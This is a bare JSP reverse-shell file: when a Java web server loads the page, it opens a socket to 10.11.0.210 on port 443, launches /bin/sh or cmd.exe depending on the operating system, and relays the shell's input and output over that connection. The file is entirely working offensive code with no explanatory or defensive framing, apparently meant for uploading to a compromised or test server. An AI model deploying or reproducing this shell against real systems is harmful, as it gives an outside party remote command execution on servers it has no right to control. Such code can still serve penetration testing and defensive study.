<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream wj;
    OutputStream cy;

    StreamConnector( InputStream wj, OutputStream cy )
    {
      this.wj = wj;
      this.cy = cy;
    }

    public void run()
    {
      BufferedReader gw  = null;
      BufferedWriter wav = null;
      try
      {
        gw  = new BufferedReader( new InputStreamReader( this.wj ) );
        wav = new BufferedWriter( new OutputStreamWriter( this.cy ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = gw.read( buffer, 0, buffer.length ) ) > 0 )
        {
          wav.write( buffer, 0, length );
          wav.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( gw != null )
          gw.close();
        if( wav != null )
          wav.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.11.0.210", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
